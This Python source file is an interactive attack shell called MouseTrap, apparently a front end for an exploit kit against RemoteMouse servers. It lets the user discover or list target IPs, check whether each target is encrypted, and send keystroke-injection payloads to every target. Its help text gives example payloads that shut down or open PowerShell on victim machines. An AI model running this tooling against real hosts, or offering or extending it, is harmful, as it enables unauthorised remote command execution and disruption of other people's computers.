"""
MouseTrap Shell - Custom shell to use MouseTrap in
Author: Axel Persinger
License: MIT License
"""


"""
Imported Libraries

cmd - Build custom shells
mousetrap - RemoteMouse exploit kit
"""
import cmd
import mousetrap

"""
Global Variables

"""


class MouseTrapShell(cmd.Cmd):
    """
    MouseTrap shell to hack RemoteMouse servers more easily
    """

    """
    Attributes

    prompt - Prompt to appear before each line
    """
    prompt = 'mt > '
    intro = """
       _   _
      (,\_/,)
       | " |   .-'
       )\g/(  (       .----------.-----------.
      /(   )\  )     /   .=====;..   .-.    //
     |\)   (/|/     / .=//    ((()  |.o'\""//
     \   '   /     /   //    ((()~~/_o_O("//
  jgs (/---\)     /   '=====((()    ""\"\"\"//
                 /___________'__________//
                 `----------'----------'`
  __  __                   _______              
 |  \/  |                 |__   __|             
 | \  / | ___  _   _ ___  ___| |_ __ __ _ _ __  
 | |\/| |/ _ \| | | / __|/ _ \ | '__/ _` | '_ \ 
 | |  | | (_) | |_| \__ \  __/ | | | (_| | |_) |
 |_|  |_|\___/ \__,_|___/\___|_|_|  \__,_| .__/ 
                                         | |    
                                         |_|    
    """
    target_dict = {}

    def help_target_status(self):
        """
        Displays help text for target_status function
        """
        print("Gets encryption status for the targets defined... Examples:")
        print("\t target_status 10.0.4.23")
        print("\t target_status 10.0.4.23,10.0.4.24")
        print("\t target_status (No argument for all targets)")


    def do_target_status(self, targets: str):
        """
        Gets the status of targets

        :param targets: user input
        :type targets: str
        """
        targets = targets.split(',') if targets else self.target_dict.keys()

        for target in targets:
            if target not in self.target_dict:
                print("WARNING: {} not in target list, skipping...".format(target))
                continue
            
            status = self.target_dict[target]
            if status == "Unknown":
                enc = mousetrap.target_encrypted(target)
                self.target_dict[target] = "Encrypted" if enc else "Unencrypted"
            
            print("{}: {}".format(target, self.target_dict[target]))


    def help_targets(self):
        """
        Displays help text for targets function
        """
        print("Prints out current targets and their encryption status")


    def do_targets(self, _: str):
        """
        Displays current targets

        :param _: User input, doesn't matter because we do nothing with it
        :type _: str
        """
        for target, status in self.target_dict.items():
            print("{}: {}".format(target, status))


    def help_define_target(self):
        """
        Displays help text for targets function
        """
        print("Define targets for the session... Examples:")
        print("\tdefine_target 192.168.1.4")
        print("\tdefine_target 192.168.1.4,192.168.1.5,10.0.4.34")
        print("\tdefine_target - (Scans for targets until SIGINT)")
        print("\tdefine_target (Clears all targets)")


    def do_define_target(self, targets: str):
        """
        Sets the targets

        :param targets: user input
        :type targets: str
        """
        if not targets:
            self.target_dict = {}
            return
        
        if targets == '-':
            self.target_dict = {k: "Unknown" for k in mousetrap.discover_targets()}
            return
        
        self.target_dict = {k: "Unknown" for k in targets.split(',')}
    

    def help_exploit(self):
        """
        Displays help text for the exploit function
        """
        print("Throws an exploit string at all targets... Examples:")
        print("\texploit hello, world!")
        print("\texploit sudo shutdown -f now")
        print("\texploit [WIN+R]powershell.exe[ENTER]shutdown /f[ENTER]")
        print("WARNING: Shell currently doesn't support encrypted targets.")
    

    def do_exploit(self, cmd: str):
        """
        Sends exploit to type the command at the targets

        :param cmd: User command
        :type cmd: str
        """
        if not cmd:
            self.help_exploit()
            return
        
        cmd_pkts = mousetrap.parse_cmd(cmd)

        for target, status in self.target_dict.items():
            if status == "Encrypted":
                print("WARNING: Shell currently doesn't support encrypted targets, skipping {}...".format(target))
            print("Throwing {} exploit at {}".format(cmd, target))
            import time
            time.sleep(3)
            mousetrap.send_exploit(cmd_pkts, target)
    

    def help_clear(self):
        """
        Displays help text for the clear function
        """
        print("Clears the display")
    

    def do_clear(self, _: str):
        """
        Clears the display

        :param _: user input, doesn't matter
        :type _: str
        """
        print("\033[2J")
        print("\033[H")
        print(self.intro)
    

    def help_exit(self):
        """
        Displays help text for the exit function
        """
        print("Exits the session")
    

    def do_exit(self, _: str):
        """
        Exits the session

        :param _: user input, doesn't matter
        :type _: str
        """
        exit()
    

    def help_quit(self):
        """
        Displays help text for the quit function
        """
        print("Quits the session")
    

    def do_quit(self, _: str):
        """
        Quits the session

        :param _: user input, doesn't matter
        :type _: str
        """
        quit()



    def do_EOF(self, line: str) -> bool:
        """
        Receives EOF signals

        :param line: user input, doesn't matter
        :type line: str
        :return: Success 
        :rtype: bool
        """
        return True


if __name__ == '__main__':
    MouseTrapShell().cmdloop()